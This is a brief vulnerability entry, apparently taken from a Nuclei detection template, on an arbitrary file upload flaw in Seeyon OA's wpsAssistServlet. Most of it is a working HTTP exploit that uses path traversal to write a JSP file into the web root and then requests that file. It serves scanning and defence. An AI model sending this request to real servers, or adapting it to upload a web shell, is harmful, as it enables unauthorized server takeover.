# Vulnerability: Seeyon OA wpsAssistServlet - Arbitrary File Upload
**Classification:** SEEYON
**Source:** Nuclei Template (`seeyon-oa-sp2-file-upload.yaml`)

## Description
There is an arbitrary file upload vulnerability in the Seeyon OA wpsAssistServlet interface. Through the vulnerability, an attacker can send a specific request packet to upload malicious files and obtain server permissions.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{filename}}.jsp&fileId=2 HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="upload"; filename="{{filename}}.xls"
Content-Type: application/vnd.ms-excel

<% out.println("{{string}}");%>
--59229605f98b8cf290a7b8908b34616b--

GET /{{filename}}.jsp HTTP/1.1
Host: {{Hostname}}
```

